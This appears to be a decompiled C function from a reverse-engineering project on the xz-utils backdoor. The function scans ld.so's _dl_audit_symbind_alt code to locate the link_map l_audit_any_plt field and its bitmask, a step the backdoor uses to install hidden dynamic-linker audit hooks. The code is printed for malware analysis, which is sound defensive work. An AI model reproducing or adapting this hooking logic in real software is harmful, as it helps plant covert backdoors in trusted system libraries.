// /home/kali/xzre-ghidra/xzregh/104EE0_find_link_map_l_audit_any_plt.c
// Function: find_link_map_l_audit_any_plt @ 0x104EE0
// Calling convention: unknown
// Prototype: undefined find_link_map_l_audit_any_plt(void)


/*
 * AutoDoc: Starting from the `_dl_audit_symbind_alt` body, it looks for the LEA that materialises
 * `link_map::l_name`, confirms the register usage matches the displacement into the link_map, and
 * then seeds an `instruction_search_ctx_t` that calls
 * `find_link_map_l_audit_any_plt_bitmask`. Success means both the offset of the byte and the mask
 * needed to set/clear it are recorded in `hooks->ldso_ctx`.
 */
#include "xzre_types.h"


undefined8 find_link_map_l_audit_any_plt(long param_1,ulong param_2,long param_3,long param_4)

{
  int *piVar1;
  undefined4 uVar2;
  int iVar3;
  long lVar4;
  long lVar5;
  byte bVar6;
  ulong uVar7;
  ulong uVar8;
  long *plVar9;
  undefined4 *puVar10;
  byte bVar11;
  ulong uVar12;
  byte bVar13;
  undefined4 local_c8;
  undefined4 local_c4;
  long local_c0;
  ulong local_b8;
  undefined4 local_b0;
  undefined4 local_ac;
  undefined4 *local_a8;
  undefined4 *local_a0;
  int local_98;
  long local_90;
  long local_88;
  long local_80;
  long local_78;
  undefined4 local_70;
  byte local_65;
  undefined4 local_64;
  byte local_60;
  int local_58;
  ulong local_50;
  
  bVar13 = 0;
  iVar3 = secret_data_append_from_call_site(0x85,0x12,8,0);
  if (iVar3 != 0) {
    piVar1 = *(int **)(param_4 + 0x118);
    plVar9 = &local_80;
    for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
      *(undefined4 *)plVar9 = 0;
      plVar9 = (long *)((long)plVar9 + (ulong)bVar13 * -8 + 4);
    }
    local_c8 = 0;
    local_c4 = 0;
    lVar5 = get_lzma_allocator(1);
    *(undefined8 *)(lVar5 + 0x10) = *(undefined8 *)(*(long *)(param_1 + 8) + 0x10);
    lVar4 = lzma_alloc(0x380);
    uVar2 = local_c4;
    *(long *)(piVar1 + 0xe) = lVar4;
    if (lVar4 != 0) {
      *piVar1 = *piVar1 + 1;
    }
    uVar7 = *(ulong *)(param_3 + 0x100);
    local_c8._0_3_ = CONCAT12(0xff,(undefined2)local_c8);
    local_c8 = CONCAT22(local_c8._2_2_,(undefined2)local_c8) | 0x80;
    local_c4._0_2_ = (ushort)local_c4 | 2;
    uVar12 = *(long *)(param_3 + 0x108) + uVar7;
    local_c4._3_1_ = SUB41(uVar2,3);
    local_c4._0_3_ = CONCAT12(0xff,(ushort)local_c4);
    lVar5 = lzma_alloc(0x690,lVar5);
    *(long *)(piVar1 + 0x10) = lVar5;
    if (lVar5 != 0) {
      *piVar1 = *piVar1 + 1;
    }
    while ((uVar7 < uVar12 &&
           (iVar3 = x86_dasm(&local_80,uVar7,uVar12), lVar5 = local_78, iVar3 != 0))) {
      if ((local_58 == 0x1036) &&
         ((((ushort)local_70 & 0x140) == 0x140 && ((byte)(local_64._1_1_ - 1U) < 2)))) {
        bVar11 = 0;
        if ((local_70 & 0x40) == 0) {
          bVar6 = 0;
          if ((((local_70 & 0x1040) != 0) &&
              (bVar6 = local_70._1_1_ & 0x10, (local_70 & 0x1000) != 0)) &&
             (bVar6 = local_60, (local_70 & 0x20) != 0)) {
            bVar6 = local_60 | (local_65 & 1) << 3;
          }
        }
        else {
          bVar6 = (byte)local_70 & 0x20;
          if ((local_70 & 0x20) == 0) {
            bVar11 = local_64._3_1_;
            if ((local_70 & 0x1040) != 0) {
              bVar6 = local_64._2_1_;
            }
          }
          else {
            bVar11 = local_64._3_1_ | local_65 * '\b' & 8;
            bVar6 = 0;
            if ((local_70 & 0x1040) != 0) {
              bVar6 = local_65 * '\x02' & 8 | local_64._2_1_;
            }
          }
        }
        if ((local_70 & 0x100) != 0) {
          uVar8 = local_50;
          if ((local_64 & 0xff00ff00) == 0x5000000) {
            uVar8 = local_50 + local_80 + local_78;
          }
          if ((uVar8 < param_2) && (uVar8 != 0)) {
            plVar9 = &local_c0;
            for (lVar4 = 0x10; lVar4 != 0; lVar4 = lVar4 + -1) {
              *(undefined4 *)plVar9 = 0;
              plVar9 = (long *)((long)plVar9 + (ulong)bVar13 * -8 + 4);
            }
            if (((int)(local_c8 & 0xffff) >> (bVar11 & 0x1f) & 1U) == 0) {
              if (((int)(local_c4 & 0xffff) >> (bVar11 & 0x1f) & 1U) == 0) goto LAB_00104fd8;
              local_c4._0_3_ = CONCAT12(bVar6,(ushort)local_c4);
              puVar10 = &local_ac;
              for (lVar4 = 7; lVar4 != 0; lVar4 = lVar4 + -1) {
                *puVar10 = 0;
                puVar10 = puVar10 + (ulong)bVar13 * -2 + 1;
              }
              local_a8 = &local_c4;
              local_a0 = &local_c8;
            }
            else {
              local_c8._0_3_ = CONCAT12(bVar6,(undefined2)local_c8);
              puVar10 = &local_ac;
              for (lVar4 = 7; lVar4 != 0; lVar4 = lVar4 + -1) {
                *puVar10 = 0;
                puVar10 = puVar10 + (ulong)bVar13 * -2 + 1;
              }
              local_a8 = &local_c8;
              local_a0 = &local_c4;
            }
            local_c0 = lVar5 + uVar7;
            local_b8 = uVar12;
            local_b0 = (int)uVar8;
            local_90 = param_3;
            local_88 = param_4;
            iVar3 = find_link_map_l_audit_any_plt_bitmask(param_1,&local_c0);
            if (iVar3 != 0) {
              return 1;
            }
            if (local_98 != 0) {
              return 0;
            }
          }
        }
      }
LAB_00104fd8:
      uVar7 = uVar7 + local_78;
    }
  }
  return 0;
}

